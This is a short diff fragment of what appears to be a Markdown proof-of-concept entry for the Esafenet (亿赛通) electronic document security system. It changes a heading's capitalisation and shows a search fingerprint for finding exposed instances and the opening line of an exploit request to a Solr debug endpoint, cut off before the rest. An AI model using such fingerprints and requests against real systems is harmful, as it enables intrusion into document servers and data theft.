@@ -8,7 +8,7 @@
 app="亿赛通电子文档安全管理系统"
 ```
 
-## poc
+## POC
 ```
 POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
 Host: 
